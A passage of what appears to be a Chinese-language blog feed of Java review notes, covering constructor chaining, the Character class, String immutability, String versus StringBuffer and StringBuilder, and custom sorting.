<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">bank</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>(<span class="hljs-string">&quot;sdf&quot;</span>,<span class="hljs-number">23</span>);<br>        System.out.println(<span class="hljs-string">&quot;C&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>第二个构造函数中调用了第一个构造函数；第三个构造函数调用了第二个构造函数。<br><strong>注意：</strong></p><blockquote><ol><li>构造函数中不能再调用自己。</li><li>构造函数之间的调用不能形成环（死循环）。</li><li>一个类中如果有 n 个构造函数，则最多有 n-1 个构造函数中可以使用 this(参数列表) 去调用其他的构造函数。</li><li>一个构造函数中的调用声明必须在当前构造函数的首行。</li><li>一个构造函数中只能使用一次 this(参数列表) ，即只能调用一次其他构造函数。（否则就违法了第4条）</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(三)-Character类</title>
    <link href="/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%89)-Character%E7%B1%BB/"/>
    <url>/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%89)-Character%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(三)。Character类。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>1.Character 类用于对单个字符进行操作。<br>2.Character 类在对象中包装一个基本类型 char 的值。<br>3.在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情况。为了解决这个问题，Java语言为内置数据类型char提供了包装类Character类。</p></blockquote><p>Character类提供了一系列方法来操纵字符。你可以使用Character的构造方法创建一个Character类对象。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Character ch = <span class="hljs-keyword">new</span> Character(<span class="hljs-string">&#x27;a&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>在某些情况下，Java编译器会自动创建一个Character对象。<br>例如，将一个char类型的参数传递给需要一个Character类型参数的方法时，那么编译器会自动地将char类型参数转换为Character对象。 这种特征称为装箱，反过来称为拆箱。<br>简单理解装箱和拆箱就是：有需要char变为Character时（char—&gt;Character），为装箱；反过来为拆箱。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 原始字符 &#x27;a&#x27; 装箱到 Character 对象 ch 中</span><br>Character ch = <span class="hljs-string">&#x27;a&#x27;</span>;<br> <br><span class="hljs-comment">// 原始字符 &#x27;x&#x27; 用 test 方法装箱</span><br><span class="hljs-comment">// 返回拆箱的值到 &#x27;c&#x27;</span><br><span class="hljs-keyword">char</span> c = test(<span class="hljs-string">&#x27;x&#x27;</span>);<br></code></pre></div></td></tr></table></figure><h3 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h3><p>前面有反斜杠（\）的字符代表转义字符，它对编译器来说是有特殊含义的。</p><table><thead><tr><th align="left">转义序列</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">\t</td><td align="left">在文中该处插入一个tab键</td></tr><tr><td align="left">\b</td><td align="left">在文中该处插入一个后退键</td></tr><tr><td align="left">\n</td><td align="left">在文中该处换行</td></tr><tr><td align="left">\r</td><td align="left">在文中该处插入回车</td></tr><tr><td align="left">\f</td><td align="left">在文中该处插入换页符</td></tr><tr><td align="left">&#39;</td><td align="left">在文中该处插入单引号</td></tr><tr><td align="left">&quot;</td><td align="left">在文中该处插入双引号</td></tr><tr><td align="left">\</td><td align="left">在文中该处插入反斜杠</td></tr></tbody></table><h3 id="Character-方法"><a href="#Character-方法" class="headerlink" title="Character 方法"></a>Character 方法</h3><table><thead><tr><th align="left">序号</th><th align="left">方法与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/java/character-isletter.html">isLetter()</a> 是否是一个字母</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/java/character-isdigit.html">isDigit()</a> 是否是一个数字字符</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/java/character-iswhitespace.html">isWhitespace()</a> 是否是一个空白字符</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/java/character-isuppercase.html">isUpperCase()</a> 是否是大写字母</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/java/character-islowercase.html">isLowerCase()</a> 是否是小写字母</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/java/character-touppercase.html">toUpperCase()</a> 指定字母的大写形式</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/java/character-tolowercase.html">toLowerCase</a>() 指定字母的小写形式</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/java/character-tostring.html">toString</a>() 返回字符的字符串形式，字符串的长度仅为1</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA知识拓展</title>
    <link href="/2021/04/09/JAVA/JAVA%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95/"/>
    <url>/2021/04/09/JAVA/JAVA%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<p>Java知识拓展。记录一些可能会遇到的问题.</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-String-类对象不可改变"><a href="#1-String-类对象不可改变" class="headerlink" title="1.String 类对象不可改变"></a>1.String 类对象不可改变</h2><p>String 类是不可改变的，但自己去测试的时候发现是可以改变的。如下测试：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;Google&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;s = &quot;</span> + s);<br><br>s = <span class="hljs-string">&quot;lichengloong&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;s = &quot;</span> + s);<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Google<br>lichengloong<br></code></pre></div></td></tr></table></figure><p>通过输出的结果可以发现String是已经改变了的。但为什么说String对象是不可变的呢？</p><blockquote><p>原因在于实例中的 s 只是一个 String 对象的引用，并不是对象本身，当执行 s = “lichengloong”; 创建了一个新的对象 “lichengloong”，而原来的 “Google” 还存在于内存中。如下图。<br><img src="https://img-blog.csdnimg.cn/20210409111345670.png"></p></blockquote><p>String 为啥是不可改变的，可以根据jdk的源码来分析。<br>字符串实际上就是一个 char 数组，并且内部就是封装了一个 char 数组。<br>并且这里 char 数组是被 final 修饰的:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span></span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span>, <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">CharSequence</span> </span>&#123;<br>    <span class="hljs-comment">/** The value is used for character storage. */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> value[];<br></code></pre></div></td></tr></table></figure><p>并且 String 中的所有的方法，都是对于 char 数组的改变，只要是对它的改变，方法内部都是返回一个新的 String 实例。</p><h2 id="2-length-方法，length-属性和-size-方法的区别"><a href="#2-length-方法，length-属性和-size-方法的区别" class="headerlink" title="2.length() 方法，length 属性和 size() 方法的区别"></a>2.length() 方法，length 属性和 size() 方法的区别</h2><ul><li>1、length() 方法是针对字符串来说的，要求一个字符串的长度就要用到它的length()方法；</li><li>2、length 属性是针对 Java 中的数组来说的，要求数组的长度可以用其 length 属性；</li><li>3、Java 中的 size() 方法是针对泛型集合说的, 如果想看这个泛型有多少个元素, 就调用此方法来查看!<br>例如：<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String array[] = &#123; <span class="hljs-string">&quot;First&quot;</span>, <span class="hljs-string">&quot;Second&quot;</span>, <span class="hljs-string">&quot;Third&quot;</span> &#125;;<br>        String a = <span class="hljs-string">&quot;HelloWorld&quot;</span>;<br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();<br>        list.add(a);<br>        System.out.println(<span class="hljs-string">&quot;数组array的长度为&quot;</span> + array.length);<br>        System.out.println(<span class="hljs-string">&quot;字符串a的长度为&quot;</span> + a.length());<br>        System.out.println(<span class="hljs-string">&quot;list中元素个数为&quot;</span> + list.size());<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果：</span><br>数组array的长度为<span class="hljs-number">3</span><br>字符串a的长度为<span class="hljs-number">10</span><br>list中元素个数为<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="3-String、StringBuffer-和-StringBuilder-的区别"><a href="#3-String、StringBuffer-和-StringBuilder-的区别" class="headerlink" title="3.String、StringBuffer 和 StringBuilder 的区别"></a>3.String、StringBuffer 和 StringBuilder 的区别</h2><ul><li><strong>String：</strong>字符串常量，字符串长度不可变。Java中String 是immutable（不可变）的。用于存放字符的数组被声明为final的，因此只能赋值一次，不可再更改。</li><li><strong>StringBuffer：</strong>字符串变量（Synchronized，即线程安全）。如果要频繁对字符串内容进行修改，出于效率考虑最好使用 StringBuffer，如果想转成 String 类型，可以调用 StringBuffer 的 toString() 方法。Java.lang.StringBuffer 线程安全的可变字符序列。在任意时间点上它都包含某种特定的字符序列，但通过某些方法调用可以改变该序列的长度和内容。可将字符串缓冲区安全地用于多个线程。</li><li><strong>StringBuilder：</strong>字符串变量（非线程安全）。在内部 StringBuilder 对象被当作是一个包含字符序列的变长数组。</li></ul><p><strong>基本原则：</strong></p><ul><li>如果要操作少量的数据用 String ；</li><li>单线程操作大量数据用StringBuilder ；</li><li>多线程操作大量数据，用StringBuffer。</li></ul><p>在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。<br>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。<br>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p><p>一般情况下，速度从快到慢为 StringBuilder &gt; StringBuffer &gt; String，当然这是相对的，不是绝对的。</p><h2 id="4-String-类中-concat-方法和-号的区别"><a href="#4-String-类中-concat-方法和-号的区别" class="headerlink" title="4.String 类中 concat() 方法和 + 号的区别"></a>4.String 类中 concat() 方法和 + 号的区别</h2><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">pubic <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>    <span class="hljs-function">pulic satic <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        String str1 = <span class="hljs-string">&quot;a&quot;</span>.concat(<span class="hljs-string">&quot;b&quot;</span>).concat(<span class="hljs-string">&quot;c&quot;</span>)；<br>        String str2 = <span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-string">&quot;b&quot;</span>+<span class="hljs-string">&quot;c&quot;</span>;<br>        String str3 = <span class="hljs-string">&quot;abc&quot;</span>;<br>        String str4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;abc&quot;</span>);<br>        System.out.println(str1 == str2); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str1 == str3); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str2 == str3); <span class="hljs-comment">//运行结果为ture</span><br>        System.out.println(str2 == str4); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str1.equals(str4)); <span class="hljs-comment">//运行结果为true</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><p>简单解释：</p><figure class="highlight processing"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs processing">首先关于 <span class="hljs-keyword">new</span> 出来的对象和 <span class="hljs-keyword">String</span> s = <span class="hljs-string">&quot;字符串&quot;</span> 的 == 执行结果为 <span class="hljs-keyword">false</span> 就不多赘述了，因为 == 比较的是两个对象的地址值，equals() 比较的是字面值。那么 <span class="hljs-built_in">concat</span> 方法和 + 号的区别在这里有体现了，我们查看<span class="hljs-built_in">concat</span>方法的源码可以看到，它是通过复制数组在通过 <span class="hljs-built_in">char</span> 数组进行拼接生成一个新的对象，所以地址值会有变动，而 + 号不会。<br></code></pre></div></td></tr></table></figure><h2 id="5-JAVA的sort实现降序排序"><a href="#5-JAVA的sort实现降序排序" class="headerlink" title="5.JAVA的sort实现降序排序"></a>5.JAVA的sort实现降序排序</h2><h3 id="1）利用-Collections-reverseOrder-方法（Collections-是一个包装类）"><a href="#1）利用-Collections-reverseOrder-方法（Collections-是一个包装类）" class="headerlink" title="1）利用 Collections.reverseOrder() 方法（Collections 是一个包装类）"></a>1）利用 Collections.reverseOrder() 方法（Collections 是一个包装类）</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer[] a=&#123;<span class="hljs-number">25</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">23</span>,<span class="hljs-number">489</span>,<span class="hljs-number">1</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>&#125;;<span class="hljs-comment">//一定要为 Interger 类型</span><br>        Arrays.sort(a, Collections.reverseOrder());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>            System.out.println(t);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="2）实现-Comparator-接口的复写-compare-方法"><a href="#2）实现-Comparator-接口的复写-compare-方法" class="headerlink" title="2）实现 Comparator 接口的复写 compare() 方法"></a>2）实现 Comparator 接口的复写 compare() 方法</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer[] a=&#123;<span class="hljs-number">25</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">23</span>,<span class="hljs-number">489</span>,<span class="hljs-number">1</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>&#125;;<br>        Comparator cmp = <span class="hljs-keyword">new</span> MyComparator();<br>        Arrays.sort(a, cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>            System.out.println(t);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 实现Comparator接口</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">Integer</span>&gt; </span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         *正常的升序排序</span><br><span class="hljs-comment">         *o1 - 要比较的第一个对象。</span><br><span class="hljs-comment">         *o2 - 要比较的第二个对象。</span><br><span class="hljs-comment">         *根据第一个参数小于、等于或大于第二个参数分别返回负整数、零或正整数。</span><br><span class="hljs-comment">         *实现降序排序</span><br><span class="hljs-comment">         * 如果o1小于o2，我们就返回正值，如果o1大于o2我们就返回负值,这样颠倒一下，就可以实现降序排序了,反之即可自定义升序排序了</span><br><span class="hljs-comment">         */</span><br>            <span class="hljs-keyword">return</span> o2 - o1;<br>        &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6-JDK中主要的包"><a href="#6-JDK中主要的包" class="headerlink" title="6.JDK中主要的包"></a>6.JDK中主要的包</h2><table><thead><tr><th align="center">包名</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">java.lang</td><td align="center">包含一些java语言的核心类，如：String、Math、Integer、System、Thread，提供常用功能</td></tr><tr><td align="center">java.net</td><td align="center">包含执行与网络相关的操作的类和接口</td></tr><tr><td align="center">java.io</td><td align="center">包含能提供多种输入/输出功能的类</td></tr><tr><td align="center">java.util</td><td align="center">包含一些实用工具类，如定义系统特性、接口的集合框架类、使用与日期日历相关的函数</td></tr><tr><td align="center">java.text</td><td align="center">包含了一些java格式化相关的类</td></tr><tr><td align="center">java.sql</td><td align="center">包含了java进行JDBC数据库编程的相关类/接口</td></tr><tr><td align="center">java.awt</td><td align="center">包含了构成抽象窗口工具集的多个类，这些类被用来构建和管理应用程序的图形用户界面</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(二)-字符串处理</title>
    <link href="/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%8C)-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%8C)-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>Java基础知识复习。字符串处理。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-String-类"><a href="#1-String-类" class="headerlink" title="1.String 类"></a>1.String 类</h3><p>通过使用 String 类的构造方法来创建字符串，该类位于 java.lang 包中。String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串。<br><strong>注意：</strong><br>String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了<br>如果需要对字符串做很多修改，那么应该选择使用 StringBuffer 或者 StringBuilder 类。<br>至于为什么String类是不可改变的，而你自己去测试时发现是可以改变的，原因可在另一篇《Java知识拓展》 中看 。</p><p>String 创建的字符串存储在公共池中，而 new 创建的字符串对象在堆上：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-string">&quot;lichengloong&quot;</span>;              <span class="hljs-comment">// String 直接创建</span><br>String s2 = <span class="hljs-string">&quot;lichengloong&quot;</span>;              <span class="hljs-comment">// String 直接创建</span><br>String s3 = s1;                    <span class="hljs-comment">// 相同引用</span><br>String s4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;lichengloong&quot;</span>);   <span class="hljs-comment">// String 对象创建</span><br>String s5 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;lichengloong&quot;</span>);   <span class="hljs-comment">// String 对象创建</span><br></code></pre></div></td></tr></table></figure><p>简单理解：</p><ul><li>公共池：就是相同的东西只有一个，所有需要他的都指向他。比如上例中的，s1、s2、s3都是指向的公共池中的同一个 lichengloong 。虽然有三个创建，但只有一个 lichengloong 。</li><li> 堆：就是new 一个就有一个。要多少就建多少。比如上例中的s4、s5就是各自创建了一个，并不是指向的同一个，而是自己是自己的。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210409105208801.png"></p><h4 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String site = <span class="hljs-string">&quot;lichengloong&quot;</span>;<br><span class="hljs-keyword">int</span> len = site.length(); <span class="hljs-comment">//length()方法与length属性区别开，具体见《java知识拓展》</span><br></code></pre></div></td></tr></table></figure><h4 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h4><p>String 类提供了连接两个字符串的方法：</p><blockquote><p>1.string1.concat(string2);返回 string2 连接 string1 的新字符串。也可以对字符串常量使用 concat() 方法，如：”我的名字是 “.concat(“lichengloong”);<br>2.更常用的是使用’+’操作符来连接字符串，如：”Hello,” + “lichengloong” + “!”</p></blockquote><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>输出格式化数字可以使用 printf() 和 format() 方法。<br>String 类使用静态方法 format() 返回一个String 对象而不是 PrintStream 对象。<br>String 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。<br>例子：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.printf(<span class="hljs-string">&quot;浮点型变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot;%f, 整型变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot; %d, 字符串变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot;is %s&quot;</span>, floatVar, intVar, stringVar);<br></code></pre></div></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String fs;<br>fs = String.format(<span class="hljs-string">&quot;浮点型变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot;%f, 整型变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot; %d, 字符串变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot; %s&quot;</span>, floatVar, intVar, stringVar);<br></code></pre></div></td></tr></table></figure><h3 id="2-StringBuffer-类"><a href="#2-StringBuffer-类" class="headerlink" title="2.StringBuffer 类"></a>2.StringBuffer 类</h3><p>StringBuffer 类是可变字符串类，创建 StringBuffer 类的对象后可以随意修改字符串的内容。每个 StringBuffer 类的对象都能够存储指定容量的字符串，如果字符串的长度超过了 StringBuffer 类对象的容量，则该对象的容量会自动扩大。</p><h4 id="创建-StringBuffer-类"><a href="#创建-StringBuffer-类" class="headerlink" title="创建 StringBuffer 类"></a>创建 StringBuffer 类</h4><p>StringBuffer 类提供了 3 个构造方法来创建一个字符串。</p><blockquote><p>1.StringBuffer() 构造一个空的字符串缓冲区，并且初始化为 16 个字符的容量。<br>2.StringBuffer(int length) 创建一个空的字符串缓冲区，并且初始化为指定长度 length 的容量。<br>3.StringBuffer(String str) 创建一个字符串缓冲区，并将其内容初始化为指定的字符串内容 str，字符串缓冲区的初始容量为 16 加上字符串 str 的长度。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer str1 = <span class="hljs-keyword">new</span> StringBuffer();<br>StringBuffer str2 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-number">10</span>);<br>StringBuffer str3 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;青春无悔&quot;</span>);<br>System.out.println(str1.capacity());    <span class="hljs-comment">// 输出 16 str1.capacity() 用于查看 str1 的容量</span><br>System.out.println(str2.capacity());    <span class="hljs-comment">// 输出 10</span><br>System.out.println(str3.capacity());    <span class="hljs-comment">// 输出 20</span><br></code></pre></div></td></tr></table></figure><h4 id="追加字符串"><a href="#追加字符串" class="headerlink" title="追加字符串"></a>追加字符串</h4><p>StringBuffer 类的 append() 方法用于向原有 StringBuffer 对象中追加字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.append(String str)<br><br>StringBuffer buffer = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello,&quot;</span>);    <span class="hljs-comment">// 创建一个 StringBuffer 对象</span><br>String str = <span class="hljs-string">&quot;World!&quot;</span>;<br>buffer.append(str);    <span class="hljs-comment">// 向 StringBuffer 对象追加 str 字符串</span><br><span class="hljs-comment">// 输出：Hello,World!</span><br></code></pre></div></td></tr></table></figure><h4 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h4><p>StringBuffer 类的 setCharAt() 方法用于在字符串的指定索引位置替换一个字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 